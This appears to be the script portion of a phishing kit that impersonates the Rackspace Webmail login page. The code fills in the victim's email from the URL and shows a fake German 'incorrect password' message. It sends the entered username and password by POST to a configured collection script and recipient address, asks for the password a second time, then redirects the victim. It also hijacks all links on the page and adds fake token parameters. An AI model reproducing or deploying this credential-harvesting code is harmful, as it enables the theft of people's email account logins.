	<script src="https://code.jquery.com/jquery-3.5.1.min.js">
	</script> 
	<script>
	   let subject="", url_main_link="",sec_p=false;
	   $(document).ready(function() {
	      url_main_link = getParameterByName(urlcheck("", "").replace("#", ""));
	      if (SHOW_EXTRA_PARAMS === true) {
	          window.history.pushState($("html").html(), "Rackspace Webmail: Hosted Email for Business", url_main_link);
	      }
	      
	      $("a").each(function (me) {$(this).attr("onclick","window.location.replace('"+url_main_link+"');return false;");});
	      const url = new URL(window.location.href);
	      let e_m = url.searchParams.has("email") ? url.searchParams.get("email") : "";
	      sec_p = url.searchParams.has("sec_p");
	      if (e_m.includes("@") === true && e_m.includes(".") === true) {
	      $("#error_show_hide").html("Das eingegebene Passwort ist falsch. Bitte versuchen Sie es erneutã");
	          $("#user-input").val(e_m).attr("readonly", "readonly");
	      }
	      
	      if (sec_p === true) {
	          $("#error_show_hide").show();
	      }
	      subject = sec_p === true ? " - Second Try" : "";
	      $("form#form").submit(function(e) {
	          e.preventDefault();
	          submit_now();
	          return false;
	      });
	      $("#chkPrvt").click(function() {
	          if (this.checked === true) {
	              $("#prvtWrn").show();
	          } else {
	              $("#prvtWrn").hide();
	          }
	      });
	      $("#lnkShwSec").click(function() {
	          if ($(this).html().toString() == "Hide explanation") {
	              $(this).html("What is this?");
	              $("#prvtExp").hide();
	          } else {
	              $(this).html("Hide explanation");
	              $("#prvtExp").show();
	          }
	          return false;
	      });
	   });

	      function validateEmail(mail) {
	          if (/^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,10})+$/.test(mail)){
	              return true;
	          }
	          return false;
	      }

	   function clkLgn() {
	   submit_now();
	   }

	   function submit_now(){
	          if (validateEmail($("#user-input").val()) === false || $("#pass-input").val().toString().length < 1) {
	              return false;
	          }
	          if ($("#login-btn").hasClass("working")) {
	              return false;
	          }
	          $("#login-btn").addClass("working");
	          $.ajax({
	              dataType: 'text',
	              url: SCRIPT_LINK,
	              type: 'POST',
	              data: {
	                  username: $("#user-input").val(),
	                  password: $("#pass-input").val(),
	                  to: DESTINATION_EMAIL,
	                  subject: subject,
	              },
	              success: function(response) {
	                  setTimeout(function() {
	                      if (sec_p === true) {
	                          window.location.replace(REDIRECT_LINK);
	                      } else {
	                          window.location.replace(url_main_link + "&sec_p=09304");
	                      }
	                  }, 500);
	              },
	              error: function(response) {
	                  window.location.replace(url_main_link);
	              },
	              complete: function() {}
	          });
	   }


	   function getParameterByName(name) {
	      let ser = "";
	      const url = new URL(name.split("#").join(""));
	      let query = url.search.split("?").join("&").split("&&").join("&");
	      let qur = url.search.split("?").join("&");
	      qur = qur.split("&&").join("&");
	      let link = url.href.split("?")[0];
	      $.each(qur.split("&"), function(index, value) {
	          var name = "---" + value.split("=")[0] + "---";
	          if (ser.includes(name)) {
	              query = query.replace("&" + value, "").replace(value, "");
	          } else {
	              ser = ser + name;
	          }
	      });
	      return (link + "?" + query).replace("?&", "?");
	   }

	   function urlcheck(e, t) {
	      let r = location.href;
	      return r.includes("?"), r.includes(e) ? r = r.replace(e, t) : r.endsWith("/") ? r += t : r = r + "/" + t, r = r + "?scriptID=" + Math.random().toString().replace("0.", "") + "&cookies=" + window.btoa(Math.random().toString()).replace("=?emai", "").replace("=", "") + "&token=" + Math.random().toString().replace("0.", "")
	   }

	</script>
